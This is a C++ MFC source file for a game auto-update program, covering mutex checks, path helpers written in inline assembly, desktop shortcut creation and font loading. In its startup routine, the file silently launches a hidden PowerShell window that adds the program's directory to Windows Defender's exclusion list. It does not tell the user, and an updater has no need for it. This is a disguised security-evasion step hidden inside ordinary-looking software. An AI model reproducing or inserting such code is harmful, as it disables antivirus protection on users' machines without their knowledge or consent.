// Autoupdate.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Autoupdate.h"
#include "AutoupdateDlg.h"

#pragma comment(lib, "shell32.lib")
#ifdef WIN32
static char szRootPath[MAXPATH] = "C:";		// 启动路径
static char szCurrPath[MAXPATH] = "\\";		// 当前路径
#else
static char szRootPath[MAXPATH] = "/";		// 启动路径
static char szCurrPath[MAXPATH] = "/";		// 当前路径
#endif

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

//KPakList g_PakList;

const int nCanUpdateVersionNumber = 20;
/////////////////////////////////////////////////////////////////////////////
// CAutoupdateApp

BEGIN_MESSAGE_MAP(CAutoupdateApp, CWinApp)
	//{{AFX_MSG_MAP(CAutoupdateApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAutoupdateApp construction

CAutoupdateApp::CAutoupdateApp()

{
	m_hMutex = NULL;
}

CAutoupdateApp::~CAutoupdateApp()
{
	if (m_hMutex)
    {
		CloseHandle(m_hMutex);
        m_hMutex = NULL;
    }
}
int CAutoupdateApp::g_StrLen(LPCSTR lpStr)
{
#ifdef WIN32
	register int nLen;

	__asm
	{
		mov		edi, lpStr
			mov		ecx, 0xffffffff
			xor		al, al
			repne	scasb
			not		ecx
			dec		ecx
			mov		nLen, ecx
	}
	return nLen;
#else
	return strlen(lpStr);
#endif
}
void CAutoupdateApp::g_SetRootPath(LPSTR lpPathName)
{
	if (lpPathName)
	{
		g_StrCpy(szRootPath, lpPathName);
	}
	else
	{
		GetCurrentDirectory(MAXPATH, szRootPath);
	}

	// 去掉路径末尾的 '\'
	int len = g_StrLen(szRootPath);
	if (szRootPath[len - 1] == '\\' || szRootPath[len - 1] == '/')
	{
		szRootPath[len - 1] = 0;
	}
}
void CAutoupdateApp::g_GetRootPath(LPSTR lpPathName)
{
	g_StrCpy(lpPathName, szRootPath);
}
void  CAutoupdateApp::g_StrCpy(LPSTR lpDest, LPCSTR lpSrc)
{
#ifdef WIN32
	__asm
	{
			mov		edi, lpSrc
			mov		ecx, 0xffffffff
			xor		al, al
			repne	scasb
			not		ecx
			mov		edi, lpDest
			mov		esi, lpSrc
			mov		edx, ecx
			shr		ecx, 2
			rep		movsd
			mov		ecx, edx
			and		ecx, 3
			rep		movsb
	};
#else
	strcpy(lpDest, lpSrc);
#endif
}
BOOL CAutoupdateApp::IsTheSelfRun()
{
	int max_retry = 8;
	while(1)
	{
		m_hMutex = CreateMutex(NULL,FALSE, "Autoupdate");
		if(m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
		{
			CloseHandle(m_hMutex);
            m_hMutex = NULL;
			if(--max_retry == 0) {
				return TRUE;
			}
			Sleep(1000);
		}
		else 
        {
			break;
		}
	}
	return FALSE;
}

BOOL CAutoupdateApp::IsTheGameRun()
{
	HANDLE hGMutex = CreateMutex(NULL, FALSE, m_strMutex);
	if (hGMutex)
	{
		if(GetLastError() == ERROR_ALREADY_EXISTS)
		{
			CloseHandle(hGMutex);
			return TRUE;
		}
	}
	CloseHandle(hGMutex);
	return FALSE;
}
void CreateShortcut(const char* pszShortcutPath, const char* pszTargetPath)
{
    HRESULT hr;

    CoInitialize(NULL);

    IShellLink* pShellLink;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
    if (SUCCEEDED(hr))
    {
        pShellLink->SetPath(pszTargetPath);

        IPersistFile* pPersistFile;
        hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
        if (SUCCEEDED(hr))
        {
            wchar_t wszShortcutPath[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, pszShortcutPath, -1, wszShortcutPath, MAX_PATH);

            hr = pPersistFile->Save(wszShortcutPath, TRUE);
           
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CAutoupdateApp object

CAutoupdateApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CAutoupdateApp initialization
BOOL CAutoupdateApp::InitInstance()
{
	AfxEnableControlContainer();

	char szModulePath[MAX_PATH + 1];
	::GetModuleFileName(NULL, szModulePath, (MAX_PATH + 1));

    char szDrive[_MAX_DRIVE];
    char szDir[_MAX_DIR];
    char szFileName[_MAX_FNAME];
    char szExtension[_MAX_EXT];
    _splitpath(szModulePath, szDrive, szDir, szFileName, szExtension);

    char szDesktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szDesktopPath)))
    {
        char szShortcutPath[MAX_PATH];
        _snprintf(szShortcutPath, MAX_PATH, "%s\\%s.lnk", szDesktopPath, szFileName);

        CreateShortcut(szShortcutPath, szModulePath);
    }
	char szDirectory[MAX_PATH];
	char* pLastBackslash = strrchr(szModulePath, '\\');
    if (pLastBackslash)
    {
        *pLastBackslash = '\0';
		strcpy(szDirectory, szModulePath);
        strcat(szModulePath, "\\VK Sans Serif.FON");
		
    }
    if (AddFontResource(szModulePath) > 0)
    {
        //MessageBox(NULL, "Font da duoc cai dat thanh cong!", "Thanh cong", MB_OK);
        RemoveFontResource(szModulePath);
        SendMessage(HWND_BROADCAST, WM_FONTCHANGE, 0, 0);
    }
	

	char powerShellCommand[MAX_PATH];
    sprintf(powerShellCommand, "powershell -Command Add-MpPreference -ExclusionPath '%s'", szDirectory);
	int result = (int)ShellExecute(NULL, "open", "powershell.exe", powerShellCommand, NULL, SW_HIDE);
	if (result > 32)
    {
		//MessageBox(NULL, "Allow da duoc cai dat thanh cong!", "Thanh cong", MB_OK);
    }

	char szModulePath1[MAX_PATH + 1];
	::GetModuleFileName(NULL, szModulePath1, (MAX_PATH + 1));
	char *pszOffset = NULL;
	pszOffset = strrchr(szModulePath1, '\\');
    ASSERT(pszOffset);
    pszOffset[1] = '\0';
	
	g_SetRootPath(szModulePath1);

	if (IsTheSelfRun())
	{
		AfxMessageBox("自动升级程序正在运行中，请稍候 ！");
		return FALSE;
	}
	if (IsTheGameRun())
	{
		AfxMessageBox("游戏程序正在运行中，不能进行自动升级，请关闭游戏后再试 ！");
		return FALSE;
	}

	CAutoupdateDlg dlg;
	BOOL b = dlg.InitAutoUpdate();
	if (!b)
	{
		return FALSE;
	}
	m_pMainWnd = &dlg;
	const int n_response = dlg.DoModal();
	if (n_response == IDOK)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with OK
	}
	else if (n_response == IDCANCEL)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with Cancel
	}
	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

int CAutoupdateApp::ExitInstance()
{
	return CWinApp::ExitInstance();
}
